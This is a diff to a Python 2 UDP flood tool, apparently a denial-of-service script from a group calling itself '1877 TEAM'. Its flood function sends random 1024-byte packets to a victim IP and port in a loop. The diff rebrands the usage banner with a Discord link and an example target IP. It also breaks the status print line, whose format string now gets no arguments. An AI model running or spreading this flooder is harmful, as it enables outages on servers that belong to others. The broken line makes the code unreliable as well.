@@ -6,11 +6,12 @@ import sys
 
 
 def usage():
-	print '---------------------------------------------------'
-	print 'USAGE: python2 D1MOD.py <url>'
-	print 'EXAMPLE : python2 D1MOD.py https://giv.tr'
-	print '1877 TEAM https://1877.team/'
-	print '---------------------------------------------------'
+	print '# ---------------------------------------------------#'
+	print '# MADE BY D1MOD https://discord.gg/d1mod             #'
+	print '# USAGE: python2 Netloris.py <IP> <PORT> <PACKET>    #'
+	print '# EXAMPLE : python2 Netloris.py 95.159.73.4          #'
+	print '# 1877 TEAM https://1877.team/                       #'
+	print '# ---------------------------------------------------#'
 
   
 def flood(victim, vport, duration):
@@ -19,7 +20,7 @@ def flood(victim, vport, duration):
     # 1024 representes one byte to the server
     bytes = random._urandom(1024)
     timeout =  time.time() + duration
-    sent = 3000
+    sent = 100000
 
     while 1:
         if time.time() > timeout:
@@ -28,7 +29,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "D1MOD1877 %s SEND %s ATTACKS %s "%(sent, victim, vport)
+        print "D1MOD1877 %s SEND %s ATTACKS %s "%()#sent, victim, vport
 
 def main():
     print len(sys.argv)
